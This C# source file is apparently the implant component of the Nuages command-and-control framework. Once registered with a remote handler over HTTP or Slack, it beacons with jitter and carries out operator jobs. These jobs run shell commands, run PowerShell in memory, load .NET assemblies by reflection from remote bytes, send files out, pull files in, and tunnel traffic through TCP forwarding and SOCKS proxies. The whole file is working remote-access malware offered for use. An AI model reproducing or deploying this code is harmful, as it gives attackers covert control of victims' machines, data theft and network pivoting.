using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Collections.ObjectModel;
using System.Reflection;
using System.Net.Sockets;
using System.Json;

namespace NuagesSharpImplant
{
    
     class NuagesC2Implant
    {
        private Dictionary<string, string> config;
        private string hostname;
        private string username;
        private string type = "SharpImplant";
        private string localIp;
        private string os;
        private string handler;
        private string connectionString;
        private NuagesC2Connector connector;
        private Dictionary<string, Assembly> assemblies;
        String[] supportedPayloads;
        JsonArray jobs;
        private Random rnd;
        private Dictionary<string, Action<JsonObject>> do_job;

        public string GetLocalIPv4()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
        {
            this.jobs = new JsonArray();

            this.config = config;

            this.connector = connector;

            this.config["handler"] = this.connector.getHandler() + "|" + this.connector.getConnectionString();

            this.assemblies = new Dictionary<string, Assembly>();

            do_job = new Dictionary<string, Action<JsonObject>>()
              {
                  {"command", (JsonObject) => do_command(JsonObject) },
                  {"cd", (JsonObject) => do_cd(JsonObject) },
                  {"configure", (JsonObject) => do_configure(JsonObject) },
                  {"exit", (JsonObject) => do_exit(JsonObject) },
                  {"download", (JsonObject) => do_download(JsonObject) },
                  {"upload", (JsonObject) => do_upload(JsonObject) },
                  {"posh_in_mem", (JsonObject) => do_posh_in_mem(JsonObject) },
                  {"reflected_assembly", (JsonObject) => do_reflected_assembly(JsonObject) },
                  {"interactive", (JsonObject) => do_interactive(JsonObject) },
                  {"tcp_fwd", (JsonObject) => do_tcp_fwd(JsonObject) },
                  {"socks", (JsonObject) => do_socks(JsonObject) },

              };

            try
            {
                this.hostname = Dns.GetHostName();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.hostname = "";
            }

            try
            {
                this.localIp = GetLocalIPv4();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.localIp = "";
            }
            try
            {
                this.username = Environment.UserName;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                this.username = "";
            }

            this.os = "windows";

            this.type = "SharpImplant";

            this.connectionString = connector.getConnectionString();

            this.supportedPayloads = new string[] { "command", "cd", "configure", "exit", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };

            this.rnd = new Random();

            this.handler = connector.getHandler();
        }

        public void Register()
        {
            while (!this.config.ContainsKey("id"))
            {
                try {
                    this.config["id"] = connector.RegisterImplant(type: this.type, hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, config: this.config, supportedPayloads: this.supportedPayloads);
                    int sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
                    System.Threading.Thread.Sleep(jitter);
                }
                catch (Exception e){
                    Console.WriteLine(e);
                    int jitter = rnd.Next((int)(5000*0.7), (int)(5000 * 1.3));
                    System.Threading.Thread.Sleep(jitter);
                }
            }
            return;
        }
        
        public void Heartbeat() {
            this.jobs = this.connector.Heartbeat(this.config["id"]);
        }

        IPAddress getIpAddress(string host){
            IPAddress result;
            if (IPAddress.TryParse(host, out result))
            {
                return result;
            }
            else {
                return Dns.GetHostEntry(host).AddressList[0];
            }
        }

        public string posh(string cmd)
        {
            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                Pipeline pipeline = runspace.CreatePipeline();
                pipeline.Commands.AddScript(cmd);
                pipeline.Commands.Add("Out-String");
                Collection<PSObject> results = pipeline.Invoke();
                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
                    {
                        stringBuilder.AppendLine(line.TrimEnd());
                    }
                }
                runspace.Close();
                return stringBuilder.ToString();
            }
            catch (Exception e)
            {
                string errorText = e.Message + "\n";
                return (errorText);
            }
        }

        public void do_command(JsonObject job) {
            string jobId = job["_id"];
            string cmd = job["payload"]["options"]["cmd"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            pProcess.StartInfo.FileName = "cmd.exe";
            pProcess.StartInfo.Arguments = " /C " + cmd;
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = true;
            pProcess.StartInfo.RedirectStandardError = true;
            pProcess.StartInfo.CreateNoWindow = true;
            pProcess.Start();
            string strOutput = pProcess.StandardOutput.ReadToEnd();
            string strError = pProcess.StandardError.ReadToEnd();
            pProcess.WaitForExit();
            bool hasError = (pProcess.ExitCode != 0);
            string result = strOutput + strError;
            SubmitJobResult(jobId, result, hasError);

        }

        public void do_cd(JsonObject job)
        {
            string jobId = job["_id"];
            string dir = job["payload"]["options"]["dir"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);

            Directory.SetCurrentDirectory(dir);

            string newDir = Directory.GetCurrentDirectory();

            SubmitJobResult(jobId, newDir, false);

        }

        public void do_configure(JsonObject job)
        {
            string jobId = job["_id"];
            JsonValue config = job["payload"]["options"]["config"];
            foreach (KeyValuePair<string, JsonValue> x in config)
            {   
                this.config[x.Key] = x.Value;
                if (x.Key == "refreshrate")
                {
                    this.connector.setRefreshRate(int.Parse(x.Value));
                }
                else if (x.Key == "buffersize")
                {

                    this.connector.setBufferSize(int.Parse(x.Value));
                }

                else if (x.Key == "handler")
                {

                        this.connector = new NuagesC2Connector(parse_handlers(x.Value.ToString().Trim('"')));
                }
            }
            List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
            foreach (KeyValuePair<string, string> p in this.config)
            {
                configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
            }

            JsonObject configObject = new JsonObject(configList);

            SubmitJobResult(jobId, configObject.ToString(), false);

        }


        public NuagesC2Connection parse_handlers(string handlers)
        {

            string[] handler_args = handlers.Split('|');

            NuagesC2Connection con;

            if (handler_args[0].ToLower() == "httpaes256")
            {

                con = new HTTPAES256Connection(handler_args[1], handler_args[2], this.connector.getBufferSize(), this.connector.getRefreshRate());

            }
            else if (handler_args[0].ToLower() == "slackaes256")
            {

                con = new SLACKAES256Connection(handler_args[1], handler_args[2], handler_args[3], handler_args[4], this.connector.getBufferSize(), this.connector.getRefreshRate());

            }
            else if (handler_args[0].ToLower() == "multi")
            {
                List<NuagesC2Connection> cons = new List<NuagesC2Connection>();

                string handler_string = handler_args[1];

                for (int i = 2; i < handler_args.Length; i++)
                {
                    handler_string += "|" + handler_args[i];
                }

                string[] handler_strings = handler_string.Split(',');

                for (int i = 0; i < handler_strings.Length; i++)
                {
                    cons.Add(parse_handlers(handler_strings[i]));
                }

                con = new MultiConnection(cons, this.connector.getBufferSize(), this.connector.getRefreshRate());
            }

            else{
                throw new Exception("Handler not supported");
            }
            return con;
        }
      

        public void do_exit(JsonObject job)
        {
            string jobId = job["_id"];
            SubmitJobResult(jobId, "Bye Bye!", false);
            System.Environment.Exit(0);

        }

        public void do_download(JsonObject job)
        {
            string jobId = job["_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            string file = job["payload"]["options"]["file"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            int length = (int)job["payload"]["options"]["length"];
            string result = "";
            using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
            {
                this.connector.Pipe2Stream(pipe_id, length, fs);
                result = fs.Name;
            }
            SubmitJobResult(jobId, result, false);

        }

        public void do_upload(JsonObject job)
        {
            string jobId = job["_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            string file = job["payload"]["options"]["file"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string result = "";
            using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                this.connector.Stream2Pipe(pipe_id, fs);
                result = fs.Name;
            }
            SubmitJobResult(jobId, result, false);

        }

        public void do_posh_in_mem(JsonObject job)
        {
            string jobId = job["_id"];
            string command = job["payload"]["options"]["command"];
            string path = ".";
            string pipe_id;
            string script;
            int length = 0;
            try
            {
                length = (int)job["payload"]["options"]["length"];
                pipe_id = job["payload"]["options"]["pipe_id"];
            }
            catch
            {
                pipe_id = "";
            }
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            if (pipe_id != "")
            {
                byte[] buffer = this.connector.PipeRead(pipe_id, length);
                script = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
            }
            else
            {
                script = "";
            }
            script += "\r\n" + command;
            string result = this.posh(script);
            SubmitJobResult(jobId, result, false);

        }

        public void do_reflected_assembly(JsonObject job)
        {
            string jobId = job["_id"];
            string arguments = job["payload"]["options"]["arguments"];
            string method = job["payload"]["options"]["method"];
            string clas = job["payload"]["options"]["class"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            int length = (int)job["payload"]["options"]["length"];
            string file_id = job["payload"]["options"]["file_id"];
            bool cache = job["payload"]["options"]["cache"];
            Assembly assembly;
            string result = "";
            Object[] argarr;
            Type[] typearr;
            if (arguments == "")
            {
                typearr = new Type[0];
                argarr = new Object[0];
            }
            else
            {
                string[] strarr = arguments.Split(',');
                typearr = new Type[strarr.Length];
                argarr = new Object[strarr.Length];
                for (int i = 0; i < strarr.Length; i++)
                {
                    if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
                    {
                        argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
                    }
                    else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
                    {
                        argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
                    }
                    else
                    {
                        argarr[i] = strarr[i];
                    }
                    typearr[i] = argarr[i].GetType();
                }
            }
            if (this.assemblies.ContainsKey(file_id) && cache)
            {
                assembly = this.assemblies[file_id];
            }
            else
            {
                byte[] buffer = this.connector.PipeRead(pipe_id, length);
                assembly = Assembly.Load(buffer);
                if (cache) { this.assemblies[file_id] = assembly; }
            }
            TextWriter oldOut = Console.Out;
            TextWriter oldOutErr = Console.Error;
            MemoryStream ostrm = new MemoryStream();
            StreamWriter writer = new StreamWriter(ostrm);
            Console.SetOut(writer);
            Console.SetError(writer);
            object objResult = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr);
            Console.SetOut(oldOut);
            Console.SetError(oldOutErr);
            writer.Close();
            ostrm.Close();
            result = Encoding.ASCII.GetString(ostrm.ToArray());
            try { result += "\r\n" + objResult.ToString(); } catch (Exception e) { }
            SubmitJobResult(jobId, result, false);
        }


        public void do_interactive(JsonObject job)
        {
            string jobId = job["_id"];
            string filename = job["payload"]["options"]["filename"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            pProcess.StartInfo.FileName = filename;
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = true;
            pProcess.StartInfo.RedirectStandardError = true;
            pProcess.StartInfo.RedirectStandardInput = true;
            pProcess.StartInfo.CreateNoWindow = true;
            pProcess.Start();
            byte[] outbuff = new byte[this.connector.getBufferSize()];
            byte[] errbuff = new byte[this.connector.getBufferSize()];
            byte[] inbuff;
            IAsyncResult outReadop = pProcess.StandardOutput.BaseStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
            IAsyncResult errReadop = pProcess.StandardError.BaseStream.BeginRead(errbuff, 0, errbuff.Length, null, null);
            int outBytesRead, errBytesRead;
            while (!pProcess.HasExited)
            {
                outBytesRead = 0;
                errBytesRead = 0;
                MemoryStream memStream = new MemoryStream();
                if (outReadop.IsCompleted)
                {
                    outBytesRead = pProcess.StandardOutput.BaseStream.EndRead(outReadop);
                    if (outBytesRead != 0)
                    {
                        memStream.Write(outbuff, 0, outBytesRead);
                        outReadop = pProcess.StandardOutput.BaseStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
                    }
                }
                if (errReadop.IsCompleted)
                {
                    errBytesRead = pProcess.StandardError.BaseStream.EndRead(errReadop);
                    if (errBytesRead != 0)
                    {
                        memStream.Write(errbuff, 0, errBytesRead);
                        errReadop = pProcess.StandardError.BaseStream.BeginRead(errbuff, 0, errbuff.Length, null, null);
                    }
                }
                if (outBytesRead + errBytesRead > 0)
                {
                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
                    memStream.Dispose();
                }
                else
                {
                    inbuff = this.connector.PipeRead(pipe_id);
                }
                if (inbuff.Length > 0)
                {
                    pProcess.StandardInput.Write(Encoding.ASCII.GetString(inbuff));
                }
                System.Threading.Thread.Sleep(this.connector.getRefreshRate());
            }
            SubmitJobResult(jobId, "Process exited!", false);

        }


        public void do_tcp_fwd(JsonObject job)
        {
            string jobId = job["_id"];
            TcpClient tcpClient = new TcpClient();
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string host = job["payload"]["options"]["host"];
            int port = (int)job["payload"]["options"]["port"];
            IPAddress ipAddress = getIpAddress(host);
            tcpClient.Connect(ipAddress, port);
            NetworkStream srvStream = tcpClient.GetStream();
            byte[] outbuff = new byte[this.connector.getBufferSize()];
            IAsyncResult outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
            int outBytesRead;
            byte[] inbuff;
            int refreshRate = this.connector.getRefreshRate();
            while (tcpClient.Connected)
            {
                outBytesRead = 0;
                MemoryStream memStream = new MemoryStream();
                if (outReadop.IsCompleted)
                {
                    outBytesRead = srvStream.EndRead(outReadop);
                    if (outBytesRead != 0)
                    {
                        memStream.Write(outbuff, 0, outBytesRead);
                        outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
                    }
                }
                if (outBytesRead > 0)
                {
                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
                    memStream.Dispose();
                }
                else
                {
                    inbuff = this.connector.PipeRead(pipe_id);
                }
                if (inbuff.Length > 0)
                {
                    srvStream.Write(inbuff, 0, inbuff.Length);
                }
                System.Threading.Thread.Sleep(refreshRate);
            }
            SubmitJobResult(jobId, "Tcp Connection Closed", false);

        }

        public void do_socks(JsonObject job)
        {
            string jobId = job["_id"];
            TcpClient tcpClient = new TcpClient();
            string pipe_id = job["payload"]["options"]["pipe_id"];
            byte[] rBuffer;
            byte[] wBuffer = new byte[2];
            rBuffer = connector.PipeRead(pipe_id, 2);
            if (rBuffer[0] == 5)
            {
                rBuffer = connector.PipeRead(pipe_id, rBuffer[1]);
                int i;
                for (i = 0; i < rBuffer.Length; i++)
                {
                    if (rBuffer[i] == 0) { break; }
                }
                wBuffer[0] = 5;
                if (rBuffer[i] != 0)
                {
                    wBuffer[1] = 255;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("No auth method found");
                }
                else
                {
                    wBuffer[1] = 0;
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                rBuffer = connector.PipeRead(pipe_id, 4);
                if (rBuffer[1] != 1)
                {
                    wBuffer[0] = 5;
                    wBuffer[1] = 7;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Not a connect");
                }
                IPAddress ipAddress;
                byte addressType = rBuffer[3];
                if (addressType == 1)
                {
                    byte[] ipv4 = connector.PipeRead(pipe_id, 4);
                    ipAddress = new IPAddress(ipv4);
                    rBuffer = connector.PipeRead(pipe_id, 2);
                    int port = rBuffer[0] * 256 + rBuffer[1];
                    tcpClient.Connect(ipAddress, port);
                    if (!tcpClient.Connected)
                    {
                        wBuffer[0] = 5;
                        wBuffer[1] = 7;
                        connector.PipeWrite(pipe_id, wBuffer);
                        throw new Exception("Could not connect to host");
                    }
                    wBuffer = new byte[10];
                    wBuffer[0] = 5;
                    wBuffer[1] = 0;
                    wBuffer[2] = 0;
                    wBuffer[3] = addressType;
                    Array.Copy(ipv4, 0, wBuffer, 4, 4);
                    Array.Copy(rBuffer, 0, wBuffer, 8, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else if (addressType == 3)
                {
                    rBuffer = connector.PipeRead(pipe_id, 1);
                    byte hostSize = rBuffer[0];
                    byte[] hostBuffer = connector.PipeRead(pipe_id, hostSize);
                    ipAddress = getIpAddress(Encoding.ASCII.GetString(hostBuffer));
                    rBuffer = connector.PipeRead(pipe_id, 2);
                    int port = rBuffer[0] * 256 + rBuffer[1];
                    tcpClient.Connect(ipAddress, port);
                    if (!tcpClient.Connected)
                    {
                        wBuffer[0] = 5;
                        wBuffer[1] = 7;
                        connector.PipeWrite(pipe_id, wBuffer);
                        throw new Exception("Could not connect to host");
                    }
                    wBuffer = new byte[7 + hostSize];
                    wBuffer[0] = 5;
                    wBuffer[1] = 0;
                    wBuffer[2] = 0;
                    wBuffer[3] = addressType;
                    wBuffer[4] = hostSize;
                    Array.Copy(hostBuffer, 0, wBuffer, 5, hostSize);
                    Array.Copy(rBuffer, 0, wBuffer, 5 + hostSize, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else
                {
                    wBuffer[0] = 5;
                    wBuffer[1] = 4;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Invalid destionation address");
                }

            }
            else if (rBuffer[0] == 4)
            {
                if (rBuffer[1] != 1)
                {
                    wBuffer[0] = 0;
                    wBuffer[1] = 91;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Invalid socks 4 command");
                }
                byte[] bufferPort = connector.PipeRead(pipe_id, 2);
                int port = bufferPort[0] * 256 + bufferPort[1];
                byte[] ipv4 = connector.PipeRead(pipe_id, 4);
                IPAddress ipAddress = new IPAddress(ipv4);
                while (rBuffer[0] != 0)
                {
                    rBuffer = connector.PipeRead(pipe_id, 1);
                }
                tcpClient.Connect(ipAddress, port);
                wBuffer = new byte[8];
                wBuffer[0] = 0;
                if (tcpClient.Connected)
                {
                    wBuffer[1] = 90;
                    Array.Copy(ipv4, 0, wBuffer, 2, 4);
                    Array.Copy(bufferPort, 0, wBuffer, 6, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else
                {
                    wBuffer[1] = 91;
                    Array.Copy(ipv4, 0, wBuffer, 2, 4);
                    Array.Copy(bufferPort, 0, wBuffer, 6, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Could not connect to host");
                }
            }
            NetworkStream srvStream = tcpClient.GetStream();
            byte[] outbuff = new byte[this.connector.getBufferSize()];
            IAsyncResult outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
            int outBytesRead;
            byte[] inbuff;
            int refreshRate = this.connector.getRefreshRate();
            while (tcpClient.Connected)
            {
                outBytesRead = 0;
                MemoryStream memStream = new MemoryStream();
                if (outReadop.IsCompleted)
                {
                    outBytesRead = srvStream.EndRead(outReadop);
                    if (outBytesRead != 0)
                    {
                        memStream.Write(outbuff, 0, outBytesRead);
                        outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
                    }
                }
                if (outBytesRead > 0)
                {
                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
                    memStream.Dispose();
                }
                else
                {
                    inbuff = this.connector.PipeRead(pipe_id);
                }
                if (inbuff.Length > 0)
                {
                    srvStream.Write(inbuff, 0, inbuff.Length);
                }
                System.Threading.Thread.Sleep(refreshRate);
            }
            SubmitJobResult(jobId, "Tcp Connection Closed", false);

        }



        public void ExecuteJob(JsonObject job)
        {
            try
            {
                string jobType = job["payload"]["type"];
                if (do_job.ContainsKey(jobType)) {
                    do_job[jobType](job);
                }
                else
                {
                    throw new Exception("Payload type not supported");
                }
            }
            catch (Exception e)
            {
                string jobId = job["_id"];
                Console.WriteLine(e);
                SubmitJobResult(jobId: jobId, result: e.Message, error: true);
            }

        }

        private void SubmitJobResult(string jobId, string result = "", bool error = false)
        {
            int n;
            int buffersize = Convert.ToInt32(this.config["buffersize"]);
            int refreshrate = Convert.ToInt32(this.config["refreshrate"]);
            for (n = 0; (n + 1) * buffersize < result.Length; n++)
            {
                this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, buffersize), moreData: true, error: error, n: n);
                System.Threading.Thread.Sleep(refreshrate);
            }
            this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, result.Length - (n * buffersize)), moreData: false, error: error, n: n);
        }

        public void Start()
        {
            this.Register();
            int sleep = 5000;
            while (true)
            {
                try
                {
                    try
                    {
                        sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    }
                    catch {
                        sleep = 5000;
                    }
                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
                    System.Threading.Thread.Sleep(jitter);
                    this.Heartbeat();
                    foreach (JsonValue job in this.jobs)
                    {
                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob((JsonObject)job));
                        thread.Start();
                    }
                }
                catch (WebException ex)
                {
                    if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                    {
                        var resp = (HttpWebResponse)ex.Response;
                        if (resp.StatusCode == HttpStatusCode.NotFound)
                        {
                            this.config.Remove("id");
                            this.Register();
                        }
                    }
                }
                catch (Exception)
                {
                }
            }

        }
    }
}
